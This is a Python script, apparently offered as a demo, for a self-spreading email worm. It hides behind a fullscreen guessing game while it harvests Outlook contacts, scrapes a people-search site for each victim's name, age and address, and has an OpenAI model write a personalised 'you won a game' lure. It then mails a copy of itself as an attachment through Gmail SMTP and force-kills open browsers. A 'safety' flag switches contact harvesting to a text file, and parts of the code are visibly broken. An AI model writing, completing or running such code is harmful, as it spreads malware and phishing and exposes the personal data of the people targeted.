import openai
import win32com.client
import webbrowser
import requests
import time
import os
import shutil
from bs4 import BeautifulSoup
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import re
import tkinter as tk
from tkinter import messagebox
import random
import threading

def distract():
    target_number = random.randint(1, 10)

    def check_guess():
        try:
            user_guess = int(guess_var.get())
            if 1 <= user_guess <= 10:
                if user_guess == target_number:
                    messagebox.showinfo("Congratulations!", "You guessed the correct number!")
                    root.destroy()
                else:
                    messagebox.showinfo("Incorrect", "Try again!")
            else:
                messagebox.showwarning("Invalid Guess", "Please enter a number between 1 and 10.")
        except ValueError:
            messagebox.showwarning("Invalid Input", "Please enter a valid number.")

    root = tk.Tk()
    root.title("Guessing Game")
    root.attributes('-fullscreen', True)
    guess_var = tk.StringVar()

    tk.Label(root, text="Guess the number between 1 and 10:").pack(pady=10)
    
    entry = tk.Entry(root, textvariable=guess_var)
    entry.pack(pady=5)

    guess_button = tk.Button(root, text="Guess", command=check_guess)
    guess_button.pack(pady=10)
    background = threading.Thread(target=main)
    background.start()
    root.lift()
    root.attributes('-topmost', True)
    root.attributes('-topmost', False)

    root.mainloop()

def youSureBro():
    #Ensure that bro is sure
    print("This is a demo of how AI can be used. To be safe, it is hardcoded to NOT colect emails, and will instead refer to emails.txt\n")
    print("Please insert your openAPI key:\n")
    print("If you are SURE you want to run this, type 'YES'.\n")
    yn = input()
    if yn == "YES":
        print("Here we go!\n")
        main()
    else:
        print("Good choice bro. Shutting down.\n")
        time.sleep(2)
        quit()

def main():
    #yoink the email contacts from outlook
    safetey = 1
    if safetey != 1:
        try:
            outApp = win32com.client.gencache.EnsureDispatch("Outlook.Application")
            outGAL = outApp.Session.GetGlobalAddressList()
            entries = outGAL.AddressEntries
            foundEmails = []
            #Get all non-null entries

            for entry in entries:
                if entry.Type == "EX":
                    user = entry.GetExchangeUser()
                    if user is not None:
                            print("Email:", user.PrimarySmtpAddress)
                            foundEmails.append(user.PrimarySmtpAddress)
        except:
            print("Sorry, something went wrong. .pst file could not be found.\n")
            quit()
            
    else:
        foundEmails = []
        print("Safetey is ON. Using text file.")
        try:
            with open("email.txt", "r") as file:
                for line in file:
                    foundEmails.append(line.strip())
        except:
            print("No dummy file detected, shutting down.\n")
            quit()

    spread(foundEmails)
    return foundEmails 

def emailMake(name, age, address, email, model="gpt-3.5-turbo"):
    #This is just the prompt for ChatGPT
    prompt = f"""Generate an email using the following variables:
    Name: {name}
    Age: {age}
    Address: {address} 

    The email should be announcing a game that this person has won, wich is attached to the email. 
    """
    messages = [{"role": "user", "content": prompt}]
    response = openai.ChatCompletion.create(
        model = model,
        messages = messages,
        temperature = 0.2,
        )
    print(response.choices[0].message["content"])
    payload(response.choices[0].message["content"], name, email)


def spread(foundEmails):
    for email in foundEmails:
        try:
            webbrowser.open("https://thatsthem.com")
            os.system("taskkill /im chrome.exe /f")
            os.system("taskkill /im firefox.exe /f")
            os.system("taskkill /im edge.exe /f")
            time.sleep(1)
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
            }
            url = "https://thatsthem.com/email/" + email
            req = requests.get(url, headers=headers)
            soup = BeautifulSoup(req.content, 'html.parser')
            html = soup.prettify()
            point = soup.find(id="app")
            data = point.find("div", class_="name")
            name = data.find("a", class_= "web")

            age = point.find("div", class_ = "age")
            
            address = point.find("span", class_ = "street")

            emailMake(name, age, address, email)

                
        except Exception as e:
            print(f"Something fucked up: {e}")

def payload(response, filteredcap, email):
    scriptn = time.strftime("%Y-%m-%d_%H%M") + '_' + os.path.basename(__file__)
    shutil.copy("Users\%USERPROFILE%\Downloads", "%USERPROFILE%\Downloads" + os.sep + "scriptn")
    emailSend(response, filteredcap, email, scriptn)
    return scriptn


def emailSend(response, name, email, scriptn):
    send_addr = EMAIL
    sender_pass = PASS
    rec_addr = email
    message = MIMEMultipart()
    message['From'] = send_addr
    message['To'] = rec_addr
    message['Subject'] = f'Congratulations! {name}'
    message.attach(MIMEText(response, 'plain'))
    pdf_name = scriptn
    attach = open(pdf_name, 'rb')
    payload = MIMEBase('application', 'octet-stream')
    payload.set_payload(attach.read())
    encoders.encode_base64(payload)
    payload.add_header('Content-Disposition', f'attachment; filename={pdf_name}')
    message.attach(payload)
    with smtplib.SMTP('smtp.gmail.com', 587) as session:
        session.starttls()
        session.login(send_addr, sender_pass)
        text = message.as_string()
        session.sendmail(send_addr, rec_addr, text)


openai.api_key = input("What is your openAPI key? (required for program to run)")
if openai.api_key == "":
    print("No key detected. Shutting down\n")
else:
    pass

EMAIL = input("Please input your email")
PASS = input("Please put in your email's password")

distract()